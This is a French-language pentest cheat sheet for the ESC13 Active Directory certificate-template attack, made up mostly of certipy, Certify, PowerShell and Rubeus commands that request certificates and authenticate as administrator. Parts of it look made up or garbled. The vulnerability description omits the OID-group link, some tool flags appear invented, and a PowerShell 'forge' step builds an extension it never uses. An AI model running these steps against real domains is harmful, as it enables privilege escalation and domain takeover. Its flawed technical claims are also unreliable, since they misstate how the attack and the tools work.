### Description

ESC13 exploite des modèles de certificats qui permettent l'issuance policy avec des OID (Object Identifier) personnalisés ou mal configurés, permettant à un attaquant de créer des certificats avec des politiques d'émission qui contournent les vérifications d'authentification normales ou d'obtenir des privilèges élevés via des politiques d'émission spécifiques.

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC13 si :

1. **Issuance Policy mal configurée** - Le modèle utilise des OID d'émission personnalisés ou dangereux
2. **Politiques d'émission contournables** - Les vérifications peuvent être bypassed via des OID spécifiques
3. **Enrollment autorisé** - L'utilisateur a les droits `Enroll` ou `AutoEnroll`
4. **Validation insuffisante des OID** - La CA n'effectue pas de validation stricte des politiques d'émission

---

### Exploitation depuis linux (certipy)

Enumération des templates avec politiques d'émission vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec focus sur les issuance policies
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Recherche spécifique des OID d'émission suspects
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A10 -B5 "Issuance.*Policy\|OID"
```

Exploitation avec OID d'émission personnalisé :

```bash
# Demande d'un certificat avec issuance policy malveillante
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'IssuancePolicyTemplate' -issuance-policy "1.3.6.1.4.1.311.21.8.123456789.1"

# Avec combinaison SAN et issuance policy
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'IssuancePolicyTemplate' -upn administrator@domain.local -issuance-policy "1.3.6.1.4.1.311.21.8.999999.1"
```

Exploitation avec forge d'OID spécifique :

```bash
# Utilisation d'un OID connu pour bypass
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'PolicyTemplate' -issuance-policy "1.3.6.1.4.1.311.21.8.1.1" -application-policy "1.3.6.1.5.5.7.3.2"
```

Authentification avec le certificat forgé :

```bash
# Authentification avec le certificat contenant la politique malveillante
certipy auth -pfx user.pfx -username user -domain domain.local -dc-ip 192.168.1.10

# Si escalation réussie
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 

# Filtrage spécifique ESC13 - issuance policies
Certify.exe find /vulnerable | findstr "Issuance.*Policy\|OID"

# Vérification manuelle des issuance policies
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties * | Where-Object {
    $_.'msPKI-Certificate-Policy' -ne $null
} | Select-Object Name, 'msPKI-Certificate-Policy'
```

Exploitation du template vulnérable :

```powershell
# Demande d'un certificat avec issuance policy spécifique
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:IssuancePolicyTemplate /policy:"1.3.6.1.4.1.311.21.8.123456789.1"

# Avec OID custom pour bypass
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:PolicyTemplate /policy:"1.3.6.1.4.1.311.21.8.999999.1" /altname:administrator@domain.local
```

Forge d'OID via PowerShell :

```powershell
# Création d'une demande avec OID personnalisé
$cert = New-SelfSignedCertificate -Subject "CN=user" -KeyUsage DigitalSignature,KeyEncipherment
$oid = New-Object System.Security.Cryptography.Oid("1.3.6.1.4.1.311.21.8.123456789.1")
$extension = New-Object System.Security.Cryptography.X509Certificates.X509Extension($oid, $false, @(0x30,0x00))

# Utilisation avec certreq pour demande personnalisée
certreq -new -config "DC01.domain.local\domain-DC01-CA" custom_request.inf custom_cert.req
```

Authentification avec le certificat obtenu :

```powershell
# Conversion du certificat si nécessaire
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 

# Authentification avec le certificat 
Rubeus.exe asktgt /user:user /certificate:cert.pfx /password:password123 /ptt

# Test d'escalation si politique malveillante acceptée
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password123 /ptt
```